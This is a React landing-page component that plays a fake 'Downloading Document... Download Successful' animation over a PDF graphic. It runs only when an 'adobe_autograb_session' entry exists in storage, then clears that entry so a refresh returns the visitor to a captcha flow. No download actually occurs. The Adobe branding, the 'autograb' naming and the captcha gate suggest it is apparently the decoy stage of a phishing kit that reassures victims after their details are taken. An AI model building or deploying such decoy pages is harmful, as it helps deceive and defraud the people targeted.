import React, { useEffect, useRef, useState } from 'react';

interface LandingPageProps {
  onFileAction?: (fileName: string, action: 'view' | 'download') => void;
}

/**
 * Updated behavior per request:
 * - Replace static Adobe icon background with a real (CSS) PDF document animation component.
 * - Run a single flow: "Downloading..." -> "Download Successful" -> then hide the text,
 *   leaving the PDF document displayed plainly (no success text over it).
 * - Make the "Downloading" and "Download Successful" texts clearly visible without
 *   heavy high-contrast treatments (no outlines/strokes/shadows).
 * - Still only show the flow once per session (sessionStorage keyed by sessionId),
 *   and remove 'adobe_autograb_session' from localStorage when the sequence finishes.
 */
const LandingPage: React.FC<LandingPageProps> = () => {
  const [showOverlay, setShowOverlay] = useState(false);
  const [phase, setPhase] = useState<'idle' | 'downloading' | 'success'>('idle');
  const [dots, setDots] = useState('');
  const [docAnimating, setDocAnimating] = useState(false);

  const dotIntervalRef = useRef<number | null>(null);
  const successTimeoutRef = useRef<number | null>(null);
  const hideOverlayTimeoutRef = useRef<number | null>(null);

  useEffect(() => {
    // Check for a session in localStorage
    try {
      const raw = localStorage.getItem('adobe_autograb_session');
      if (!raw) return;

      let session: any = null;
      try {
        session = JSON.parse(raw);
      } catch {
        session = null;
      }
      // Derive a session id to track whether we've shown the overlay for this session
      const sessionId = (session && (session.sessionId || session.timestamp)) ? String(session.sessionId || session.timestamp) : null;
      if (!sessionId) return;

      const shownKey = `adobe_download_shown::${sessionId}`;
      const alreadyShown = sessionStorage.getItem(shownKey);
      if (alreadyShown) {
        // Already shown previously in this tab/session — do not restart
        return;
      }

      // Start the download sequence
      setShowOverlay(true);
      setPhase('downloading');
      setDocAnimating(true);

      // animate dots (1..6)
      let dotCount = 1;
      const maxDots = 6;
      const dotInterval = 500; // ms
      dotIntervalRef.current = window.setInterval(() => {
        dotCount = dotCount >= maxDots ? 1 : dotCount + 1;
        setDots('.'.repeat(dotCount));
      }, dotInterval) as unknown as number;

      // After 3 seconds show success, then shortly after hide overlay
      successTimeoutRef.current = window.setTimeout(() => {
        // stop dot animation
        if (dotIntervalRef.current) {
          clearInterval(dotIntervalRef.current);
          dotIntervalRef.current = null;
        }
        setPhase('success');
        setDots('');

        // mark shown so we don't restart sequence for same session
        try {
          sessionStorage.setItem(shownKey, new Date().toISOString());
        } catch {
          // ignore
        }

        // REMOVE persisted session so that a full page refresh will return the user
        // to the captcha flow (App.tsx reads localStorage on load).
        try {
          localStorage.removeItem('adobe_autograb_session');
        } catch {
          // ignore failures to remove storage
        }

        // Hide the overlay text after a short delay, leaving the PDF document plain.
        hideOverlayTimeoutRef.current = window.setTimeout(() => {
          setShowOverlay(false);
          setPhase('idle');
          setDocAnimating(false);
          hideOverlayTimeoutRef.current = null;
        }, 1200) as unknown as number;

        successTimeoutRef.current = null;
      }, 3000) as unknown as number;

    } catch (err) {
      // ignore any storage/access errors
      // do not show overlay if something fails
    }

    return () => {
      // cleanup timers on unmount
      if (dotIntervalRef.current) {
        clearInterval(dotIntervalRef.current);
        dotIntervalRef.current = null;
      }
      if (successTimeoutRef.current) {
        clearTimeout(successTimeoutRef.current);
        successTimeoutRef.current = null;
      }
      if (hideOverlayTimeoutRef.current) {
        clearTimeout(hideOverlayTimeoutRef.current);
        hideOverlayTimeoutRef.current = null;
      }
    };
  }, []);

  return (
    <div
      style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: '#f4f6f8',
        color: '#111'
      }}
    >
      {/* Simple PDF Document Animation replacing the previous static icon */}
      <PDFDocument animating={docAnimating} />

      {/* Overlay with plain text and dot animation (no high-contrast outlines/shadows) */}
      {showOverlay && (
        <div
          aria-live="polite"
          role="status"
          style={{
            position: 'fixed',
            inset: 0,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            pointerEvents: 'none',
            zIndex: 9999
          }}
        >
          <div
            style={{
              background: 'rgba(255,255,255,0.92)',
              color: '#111',
              textAlign: 'center',
              fontFamily: 'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial',
              fontSize: 18,
              fontWeight: 600,
              pointerEvents: 'none',
              padding: '12px 16px',
              borderRadius: 10,
              border: '1px solid rgba(0,0,0,0.06)',
              boxShadow: '0 4px 16px rgba(0,0,0,0.08)'
            }}
          >
            {phase === 'downloading' && <span>Downloading Document{dots}</span>}
            {phase === 'success' && <span>Download Successful</span>}
          </div>
        </div>
      )}
    </div>
  );
};

function PDFDocument({ animating }: { animating: boolean }) {
  return (
    <div style={{ position: 'relative' }}>
      <style>
        {`
          @keyframes pdfFloat {
            0%   { transform: translateY(0px);   }
            50%  { transform: translateY(-10px); }
            100% { transform: translateY(0px);   }
          }
          .pdf-doc {
            position: relative;
            width: 240px;
            height: 300px;
            border-radius: 14px;
            background: #ffffff;
            box-shadow: 0 10px 28px rgba(0,0,0,0.12);
            transition: transform 300ms ease;
          }
          .pdf-doc.animating {
            animation: pdfFloat 3s ease-in-out infinite;
          }
          .pdf-fold {
            position: absolute;
            top: 0;
            right: 0;
            width: 0;
            height: 0;
            border-left: 34px solid transparent;
            border-top: 34px solid #eceff3;
            border-top-right-radius: 10px;
          }
          .pdf-badge {
            position: absolute;
            top: 12px;
            left: 12px;
            background: #e53935;
            color: #fff;
            font-weight: 700;
            font-size: 12px;
            padding: 4px 8px;
            border-radius: 6px;
            letter-spacing: 0.6px;
          }
          .pdf-lines span {
            display: block;
            height: 10px;
            background: #e9eef3;
            border-radius: 6px;
            margin: 12px 18px;
          }
          .pdf-lines span:nth-child(1) { width: 82%; margin-top: 64px; }
          .pdf-lines span:nth-child(2) { width: 66%; }
          .pdf-lines span:nth-child(3) { width: 90%; }
          .pdf-lines span:nth-child(4) { width: 72%; }
          .pdf-lines span:nth-child(5) { width: 86%; }
        `}
      </style>
      <div className={`pdf-doc ${animating ? 'animating' : ''}`}>
        <div className="pdf-fold" />
        <div className="pdf-badge">PDF</div>
        <div className="pdf-lines">
          <span />
          <span />
          <span />
          <span />
          <span />
        </div>
      </div>
    </div>
  );
}

export default LandingPage;
